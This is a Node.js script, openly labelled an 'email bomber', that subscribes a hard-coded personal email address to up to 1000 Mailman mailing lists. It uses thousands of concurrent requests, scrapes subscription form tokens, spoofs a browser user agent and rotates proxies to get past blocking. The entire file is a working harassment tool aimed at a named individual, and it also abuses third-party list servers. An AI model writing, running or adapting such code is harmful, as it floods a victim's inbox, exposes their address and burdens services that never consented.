const runProgram = () => {
  // add your program code here


  const request = require('request')
  const { readFileSync } = require('fs')
  const ProxyManager = require('./lib/ProxyManager.js');
  const ttt1 = readFileSync('lib/list-test.txt', 'utf8').replace(/\r/g, '').split('\n')
  const ttt = readFileSync('lib/list.txt', 'utf8').replace(/\r/g, '').split('\n')
  const amount = 1000
  const newsletter = shuffle(ttt).slice(0, amount)
  const chalk = require('chalk')
  const cliProgress = require('cli-progress');

  // Colours
  const green = (msg) => { return chalk.green(msg) }
  const red = (msg) => { return chalk.red(msg) }
  const yellow = (msg) => { return chalk.yellow(msg) }
  const cyan = (msg) => { return chalk.cyan(msg) }

  // Progress bar
  const progressBar = new cliProgress.SingleBar({
    format: 'Bombing progress |' + cyan('{bar}') + '| {percentage}% | {value}/{total} E-mails',
    barCompleteChar: '\u2588',
    /*barIncompleteChar: '\u2591',
    hideCursor: true*/
  });

  let threads = 10000;
  let threadList = []
  let success = 10000;
  let fail = 10;
  let email = "joel@jungkeim.de"

  class Newsletter {
    constructor(i) {
      this.id = i;
      this.site = this.getSite();
      this.email = email;
      this.tries = 100;
      this.maxTries = 2000;
      this.agent = null;//ProxyManager.getAgent();
      this.jar = request.jar();
      setTimeout(() => {
        this.start();
      }, 100)
    }
    start() {
      let tmp = this.getPostSite()
      if (tmp !== undefined) {
        request.post({
          url: tmp,
          rejectUnauthorized: false,
          timeout: 15000,
          headers: {
            'Connection': 'keep-alive',
            'Origin': 'https://lists.wikimedia.org',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
          },
          jar: this.jar,
          followAllRedirects: true,
          body: `email=${this.email}&fullname=${this.email}&language=en&digest=0&email-button=Subscribe`,
          agent: this.agent
        }, (err, res, body) => {
          if (body) {
            if (body.includes("Your subscription request") || body.includes("Confirmation from your email address is required")) {
              //this.log(`Successfully bombed ${success++}`, green)
              progressBar.increment();
            } else {
              //this.log(`Trying forum ${this.site} \n ${fail++}`, red)
              return this.tryForum();
            }
            this.reset(true)
          } else {
            //console.log(this.site)
            this.retry()
          }
        });
      }
    }
    tryForum() {

      request.get({
        url: this.site,
        rejectUnauthorized: false,
        timeout: 15000,
        jar: this.jar,
        followAllRedirects: true
      }, (e, r, b) => {
        if (b) {
          let temp = b.split('name="sub_form_token" value="').pop().split('">')[0];
          if (temp)
            this.sendForum(temp)
        } else {
          this.retry();
        }
      })

    }
    sendForum(token) {
      let tmp = this.getPostSite()
      let dataString;
      if (token) {
        dataString = `sub_form_token=${token}&email=${this.email}&fullname=${this.email}&pw=&pw-conf=&digest=0&email-button=Subscribe`;
      } else {
        dataString = `email=${this.email}&fullname=${this.email}&pw=&pw-conf=&digest=0&email-button=Subscribe`;
      }

      request.post({
        url: tmp,
        headers: {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
          'Accept-Language': 'en-US,en;'
        },
        body: dataString
      }, (e, r, b) => {
        if (b) {
          if (b.includes("Your subscription request") || b.includes("Confirmation from your email address is required")) {
            this.log(`Successfully bombed ${success++}`, green)
            progressBar.increment();
          } else {
            //console.log(tmp,b)
          }
          this.reset(true)
        } else {
          //console.log(this.site)
          this.reset(true)
        }
      });
    }
    getSite() {
      try {
        return newsletter.shift();
      } catch (e) { }
    }
    getPostSite() {
      if (this.site) {
        if (this.site.includes("cosmo-model.org")) {
          return this.site.replace('mailman/listinfo', 'mmSubscribe_nxt')
        }
        return this.site.replace('listinfo', 'subscribe')
      } else {
        threadList.push(this.id)
        //this.log('No more sites exiting thread num:' + this.id, yellow)
        return undefined;
      }
    }
    reset() {
      this.tries = 0;
      this.jar = request.jar();
      this.site = this.getSite();
      setTimeout(() => {
        this.start();
      }, Math.random() * 10);
    }
    retry() {
      if (this.tries < this.maxTries) {
        this.tries++;
        this.agent = ProxyManager.getAgent()
        //console.log('trying', this.tries)
        setTimeout(() => {
          this.start();
        }, Math.random() * 100);
      } else {
        this.agent = ProxyManager.getAgent()
        //this.log(`Something is wrong ${fail++}`, red)
        //console.log(this.site)
        this.reset()
      }

    }
    log(msg, color) {
      console.log(color(msg))
    }
  }
  function shuffle(array) {
    let counter = array.length;

    while (counter > 0) {
      let index = Math.floor(Math.random() * counter);

      counter--;

      let temp = array[counter];
      array[counter] = array[index];
      array[index] = temp;
    }

    return array;
  }
  async function start() {
    //await ProxyManager.loadProxiesLink("https://default-api.optimusprime1.repl.co/proxies?raw=1");
    console.log(yellow(`Starting email bomber with ${threads} threads!`))
    for (let i = 0; i < threads; i++) {
      new Newsletter(i)
    }
    progressBar.start(amount)
    checkThreads()
  }
  start().catch(e => console.log(e));
  function checkThreads() {
    setInterval(() => {
      if (threadList.length == threads) {
        console.log(yellow(`\nFinished!`))
        process.exit()
      }
    }, 1000)
  }

  // Ask user if they want to run the program again
  const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });

  readline.question('Do you want to run the program again? (y/n): ', (answer) => {
    if (answer === 'y') {
      readline.close();
      // run the program again
      runProgram();
    } else {
      console.log('Program terminated.');
      readline.close();
    }
  });
}

// start the program
runProgram();
